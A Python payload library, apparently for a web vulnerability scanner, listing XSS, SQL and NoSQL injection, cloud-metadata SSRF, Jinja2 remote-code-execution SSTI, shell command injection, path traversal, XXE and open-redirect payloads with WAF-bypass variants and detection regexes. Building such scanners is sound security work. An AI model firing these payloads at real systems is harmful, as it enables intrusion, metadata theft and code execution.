#!/usr/bin/env python3
"""
Advanced Vulnerability Payloads
Comprehensive payloads for detecting various vulnerabilities with improved detection patterns
"""

from typing import List, Dict, Tuple
from dataclasses import dataclass
import re


@dataclass
class VulnPayload:
    """Represents a vulnerability test payload"""
    name: str
    payload: str
    detection_pattern: str  # Regex pattern to detect success
    vulnerability_type: str  # xss, sqli, ssrf, ssti, etc.
    severity: str  # critical, high, medium, low
    context: str  # where it works best (param, header, path, etc.)
    description: str
    bypass_technique: str = ""  # WAF bypass technique used


# XSS Payloads - Polyglot and Context-Aware
XSS_PAYLOADS = [
    # Polyglot XSS (works in multiple contexts)
    VulnPayload(
        name="polyglot_xss_1",
        payload='jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//',
        detection_pattern=r'<svg.*?onload.*?>|oNcliCk.*?alert|javascript:.*alert',
        vulnerability_type="xss",
        severity="high",
        context="any",
        description="Polyglot XSS payload that works in multiple contexts",
        bypass_technique="case variation, encoding, multiple contexts"
    ),
    
    # HTML Context
    VulnPayload(
        name="html_xss_img",
        payload='<img src=x onerror=alert(document.domain)>',
        detection_pattern=r'<img\s+src=x\s+onerror=alert',
        vulnerability_type="xss",
        severity="high",
        context="html",
        description="Basic img tag XSS",
    ),
    
    VulnPayload(
        name="html_xss_svg",
        payload='<svg/onload=alert(1)>',
        detection_pattern=r'<svg.*?onload.*?alert',
        vulnerability_type="xss",
        severity="high",
        context="html",
        description="SVG-based XSS",
    ),
    
    # Script Context
    VulnPayload(
        name="script_context_break",
        payload="'-alert(1)-'",
        detection_pattern=r"'-alert\(1\)-'",
        vulnerability_type="xss",
        severity="high",
        context="script",
        description="Script context string escape",
    ),
    
    # Attribute Context
    VulnPayload(
        name="attr_context_break",
        payload='" onmouseover="alert(1)" x="',
        detection_pattern=r'onmouseover.*?alert',
        vulnerability_type="xss",
        severity="high",
        context="attribute",
        description="Break out of HTML attribute",
    ),
    
    # WAF Bypass Techniques
    VulnPayload(
        name="xss_encoded",
        payload='<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">',
        detection_pattern=r'<img.*?onerror.*?&#',
        vulnerability_type="xss",
        severity="high",
        context="html",
        description="HTML entity encoded XSS",
        bypass_technique="HTML entity encoding"
    ),
    
    VulnPayload(
        name="xss_data_uri",
        payload='<object data="data:text/html,<script>alert(1)</script>">',
        detection_pattern=r'data:text/html.*?<script>',
        vulnerability_type="xss",
        severity="high",
        context="html",
        description="Data URI XSS",
        bypass_technique="data: URI"
    ),
    
    # DOM-based XSS
    VulnPayload(
        name="dom_xss_hash",
        payload='#<img src=x onerror=alert(1)>',
        detection_pattern=r'#<img.*?onerror',
        vulnerability_type="xss_dom",
        severity="high",
        context="url_hash",
        description="DOM XSS via URL hash",
    ),
]

# SQL Injection Payloads
SQLI_PAYLOADS = [
    # Time-based SQLi (most reliable)
    VulnPayload(
        name="sqli_mysql_sleep",
        payload="' AND SLEEP(5)-- -",
        detection_pattern=r"response_time>5",  # Special: check response time
        vulnerability_type="sqli_time",
        severity="critical",
        context="param",
        description="MySQL time-based blind SQLi",
    ),
    
    VulnPayload(
        name="sqli_postgres_sleep",
        payload="'; SELECT pg_sleep(5)-- -",
        detection_pattern=r"response_time>5",
        vulnerability_type="sqli_time",
        severity="critical",
        context="param",
        description="PostgreSQL time-based blind SQLi",
    ),
    
    VulnPayload(
        name="sqli_mssql_waitfor",
        payload="'; WAITFOR DELAY '00:00:05'-- -",
        detection_pattern=r"response_time>5",
        vulnerability_type="sqli_time",
        severity="critical",
        context="param",
        description="MSSQL time-based blind SQLi",
    ),
    
    # Error-based SQLi
    VulnPayload(
        name="sqli_mysql_error",
        payload="' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -",
        detection_pattern=r"Duplicate entry|mysql|version",
        vulnerability_type="sqli_error",
        severity="critical",
        context="param",
        description="MySQL error-based SQLi",
    ),
    
    # Boolean-based SQLi
    VulnPayload(
        name="sqli_bool_true",
        payload="' OR '1'='1",
        detection_pattern=r"content_diff>0.8",  # Compare with false condition
        vulnerability_type="sqli_bool",
        severity="critical",
        context="param",
        description="Boolean-based SQLi (true condition)",
    ),
    
    VulnPayload(
        name="sqli_bool_false",
        payload="' OR '1'='2",
        detection_pattern=r"content_diff<0.2",
        vulnerability_type="sqli_bool",
        severity="critical",
        context="param",
        description="Boolean-based SQLi (false condition)",
    ),
    
    # UNION-based SQLi
    VulnPayload(
        name="sqli_union",
        payload="' UNION SELECT NULL,NULL,NULL-- -",
        detection_pattern=r"null|select|union",
        vulnerability_type="sqli_union",
        severity="critical",
        context="param",
        description="UNION-based SQLi",
    ),
    
    # NoSQL Injection
    VulnPayload(
        name="nosql_mongo_auth_bypass",
        payload='{"$ne": null}',
        detection_pattern=r"logged|authenticated|success",
        vulnerability_type="nosql",
        severity="critical",
        context="json",
        description="MongoDB authentication bypass",
    ),
]

# SSRF Payloads
SSRF_PAYLOADS = [
    # Cloud metadata endpoints
    VulnPayload(
        name="ssrf_aws_metadata",
        payload="http://169.254.169.254/latest/meta-data/",
        detection_pattern=r"ami-id|instance-id|local-ipv4",
        vulnerability_type="ssrf",
        severity="critical",
        context="url_param",
        description="AWS metadata SSRF",
    ),
    
    VulnPayload(
        name="ssrf_gcp_metadata",
        payload="http://metadata.google.internal/computeMetadata/v1/",
        detection_pattern=r"instance/|project/",
        vulnerability_type="ssrf",
        severity="critical",
        context="url_param",
        description="GCP metadata SSRF",
    ),
    
    VulnPayload(
        name="ssrf_azure_metadata",
        payload="http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        detection_pattern=r"compute/|network/",
        vulnerability_type="ssrf",
        severity="critical",
        context="url_param",
        description="Azure metadata SSRF",
    ),
    
    # Internal network scanning
    VulnPayload(
        name="ssrf_localhost",
        payload="http://localhost:80",
        detection_pattern=r"apache|nginx|iis|lighttpd",
        vulnerability_type="ssrf",
        severity="high",
        context="url_param",
        description="SSRF to localhost",
    ),
    
    VulnPayload(
        name="ssrf_internal_ip",
        payload="http://127.0.0.1:6379",
        detection_pattern=r"redis|connected",
        vulnerability_type="ssrf",
        severity="high",
        context="url_param",
        description="SSRF to internal Redis",
    ),
    
    # Protocol smuggling
    VulnPayload(
        name="ssrf_file_protocol",
        payload="file:///etc/passwd",
        detection_pattern=r"root:x:|nobody:",
        vulnerability_type="ssrf_file",
        severity="critical",
        context="url_param",
        description="SSRF with file:// protocol",
    ),
    
    VulnPayload(
        name="ssrf_gopher_smtp",
        payload="gopher://localhost:25/_MAIL FROM:attacker@evil.com",
        detection_pattern=r"250|smtp",
        vulnerability_type="ssrf_gopher",
        severity="high",
        context="url_param",
        description="SSRF with gopher:// protocol",
    ),
]

# SSTI (Server-Side Template Injection) Payloads
SSTI_PAYLOADS = [
    # Jinja2 (Python)
    VulnPayload(
        name="ssti_jinja2_basic",
        payload="{{7*7}}",
        detection_pattern=r"\b49\b",
        vulnerability_type="ssti",
        severity="critical",
        context="template",
        description="Jinja2 SSTI - basic math",
    ),
    
    VulnPayload(
        name="ssti_jinja2_rce",
        payload="{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        detection_pattern=r"uid=|gid=",
        vulnerability_type="ssti_rce",
        severity="critical",
        context="template",
        description="Jinja2 SSTI - RCE",
    ),
    
    # Twig (PHP)
    VulnPayload(
        name="ssti_twig_basic",
        payload="{{7*7}}",
        detection_pattern=r"\b49\b",
        vulnerability_type="ssti",
        severity="critical",
        context="template",
        description="Twig SSTI - basic math",
    ),
    
    # Freemarker (Java)
    VulnPayload(
        name="ssti_freemarker",
        payload="${7*7}",
        detection_pattern=r"\b49\b",
        vulnerability_type="ssti",
        severity="critical",
        context="template",
        description="Freemarker SSTI - basic math",
    ),
    
    # Handlebars (Node.js)
    VulnPayload(
        name="ssti_handlebars",
        payload="{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{/with}}{{/with}}{{/with}}",
        detection_pattern=r"function|constructor",
        vulnerability_type="ssti",
        severity="critical",
        context="template",
        description="Handlebars SSTI",
    ),
]

# Command Injection Payloads
COMMAND_INJECTION_PAYLOADS = [
    VulnPayload(
        name="cmdi_semicolon",
        payload="; id",
        detection_pattern=r"uid=|gid=",
        vulnerability_type="command_injection",
        severity="critical",
        context="param",
        description="Command injection with semicolon",
    ),
    
    VulnPayload(
        name="cmdi_pipe",
        payload="| id",
        detection_pattern=r"uid=|gid=",
        vulnerability_type="command_injection",
        severity="critical",
        context="param",
        description="Command injection with pipe",
    ),
    
    VulnPayload(
        name="cmdi_backticks",
        payload="`id`",
        detection_pattern=r"uid=|gid=",
        vulnerability_type="command_injection",
        severity="critical",
        context="param",
        description="Command injection with backticks",
    ),
    
    VulnPayload(
        name="cmdi_dollar",
        payload="$(id)",
        detection_pattern=r"uid=|gid=",
        vulnerability_type="command_injection",
        severity="critical",
        context="param",
        description="Command injection with $() syntax",
    ),
    
    # Time-based detection
    VulnPayload(
        name="cmdi_sleep",
        payload="; sleep 5",
        detection_pattern=r"response_time>5",
        vulnerability_type="command_injection",
        severity="critical",
        context="param",
        description="Command injection with sleep (time-based)",
    ),
]

# Path Traversal Payloads
PATH_TRAVERSAL_PAYLOADS = [
    VulnPayload(
        name="lfi_passwd",
        payload="../../../etc/passwd",
        detection_pattern=r"root:x:|nobody:",
        vulnerability_type="lfi",
        severity="high",
        context="file_param",
        description="Basic path traversal to /etc/passwd",
    ),
    
    VulnPayload(
        name="lfi_windows",
        payload="..\\..\\..\\windows\\win.ini",
        detection_pattern=r"\[fonts\]|\[extensions\]",
        vulnerability_type="lfi",
        severity="high",
        context="file_param",
        description="Windows path traversal",
    ),
    
    VulnPayload(
        name="lfi_null_byte",
        payload="../../../etc/passwd%00",
        detection_pattern=r"root:x:|nobody:",
        vulnerability_type="lfi",
        severity="high",
        context="file_param",
        description="Path traversal with null byte",
        bypass_technique="null byte injection"
    ),
    
    VulnPayload(
        name="lfi_double_encoding",
        payload="..%252f..%252f..%252fetc%252fpasswd",
        detection_pattern=r"root:x:|nobody:",
        vulnerability_type="lfi",
        severity="high",
        context="file_param",
        description="Double-encoded path traversal",
        bypass_technique="double URL encoding"
    ),
]

# XXE (XML External Entity) Payloads
XXE_PAYLOADS = [
    VulnPayload(
        name="xxe_basic",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        detection_pattern=r"root:x:|nobody:",
        vulnerability_type="xxe",
        severity="critical",
        context="xml",
        description="Basic XXE to read file",
    ),
    
    VulnPayload(
        name="xxe_ssrf",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        detection_pattern=r"ami-id|instance-id",
        vulnerability_type="xxe_ssrf",
        severity="critical",
        context="xml",
        description="XXE for SSRF to AWS metadata",
    ),
]

# Open Redirect Payloads
OPEN_REDIRECT_PAYLOADS = [
    VulnPayload(
        name="redirect_evil_com",
        payload="https://evil.com",
        detection_pattern=r"location.*evil\.com",
        vulnerability_type="open_redirect",
        severity="medium",
        context="redirect_param",
        description="Basic open redirect",
    ),
    
    VulnPayload(
        name="redirect_protocol",
        payload="//evil.com",
        detection_pattern=r"location.*//evil\.com",
        vulnerability_type="open_redirect",
        severity="medium",
        context="redirect_param",
        description="Protocol-relative redirect",
    ),
    
    VulnPayload(
        name="redirect_javascript",
        payload="javascript:alert(document.domain)",
        detection_pattern=r"javascript:alert",
        vulnerability_type="open_redirect_xss",
        severity="high",
        context="redirect_param",
        description="JavaScript protocol redirect (XSS)",
    ),
]


# Aggregate all payloads
ALL_PAYLOADS = {
    "xss": XSS_PAYLOADS,
    "sqli": SQLI_PAYLOADS,
    "ssrf": SSRF_PAYLOADS,
    "ssti": SSTI_PAYLOADS,
    "command_injection": COMMAND_INJECTION_PAYLOADS,
    "path_traversal": PATH_TRAVERSAL_PAYLOADS,
    "xxe": XXE_PAYLOADS,
    "open_redirect": OPEN_REDIRECT_PAYLOADS,
}


def get_payloads_by_type(vuln_type: str) -> List[VulnPayload]:
    """Get payloads for a specific vulnerability type"""
    return ALL_PAYLOADS.get(vuln_type, [])


def get_all_payloads() -> List[VulnPayload]:
    """Get all payloads"""
    all_payloads = []
    for payloads in ALL_PAYLOADS.values():
        all_payloads.extend(payloads)
    return all_payloads


def get_high_priority_payloads() -> List[VulnPayload]:
    """Get only critical/high severity payloads"""
    all_payloads = get_all_payloads()
    return [p for p in all_payloads if p.severity in ['critical', 'high']]


if __name__ == "__main__":
    # Print summary
    print("Vulnerability Payload Summary")
    print("=" * 60)
    
    for vuln_type, payloads in ALL_PAYLOADS.items():
        critical = sum(1 for p in payloads if p.severity == 'critical')
        high = sum(1 for p in payloads if p.severity == 'high')
        medium = sum(1 for p in payloads if p.severity == 'medium')
        
        print(f"\n{vuln_type.upper()}:")
        print(f"  Total: {len(payloads)} payloads")
        print(f"  Critical: {critical}, High: {high}, Medium: {medium}")
        
        # Show example
        if payloads:
            example = payloads[0]
            print(f"  Example: {example.name}")
            print(f"    Payload: {example.payload[:60]}...")
    
    total = len(get_all_payloads())
    high_priority = len(get_high_priority_payloads())
    print(f"\n{'='*60}")
    print(f"Total Payloads: {total}")
    print(f"High Priority: {high_priority}")
